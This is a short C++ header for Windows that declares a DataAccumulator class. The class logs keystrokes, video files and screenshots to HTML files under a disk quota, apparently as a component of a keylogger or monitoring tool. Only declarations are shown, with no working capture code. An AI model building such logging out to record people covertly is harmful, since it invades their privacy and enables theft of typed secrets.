#pragma once
#include <Windows.h>
#include "DiskQuotaWatcher.h"

class DataAccumulator
{
private:
	static const int BUFFER_SIZE;
	static const PSTR const DATA_FILE_NAME;

	BOOL mIsFirstLog;
	DiskQuotaWatcher* quotaWatcher;
	FILETIME mLastLogTime;
	SYSTEMTIME mFirstLogInFile;
	int mCurrentChunkLength;
	WCHAR* chunk;
	bool mPreviousRowExists;
	bool mPreviousParagraphExists;
	int GetElapsedSecondsFromLastLog();
	void Log2HTML(PWSTR htmlString);
	void Append2Log(PWSTR appendee);
	void FlushChunk();
	LPCWSTR GetHtmlFromResource(int resourceId, PWORD length);

public:
	DataAccumulator(void);
	~DataAccumulator(void);
	void SetDiskQuota(int quota) { quotaWatcher->SetQuota(quota);}
	void RegisterNewFile(PSTR fileName) { quotaWatcher->RegisterNewFile(fileName); }
	void LogKey(PWSTR key);
	void LogVideo(PTSTR videoFile);
	void LogPrintScreen(PTSTR imageFile);
};

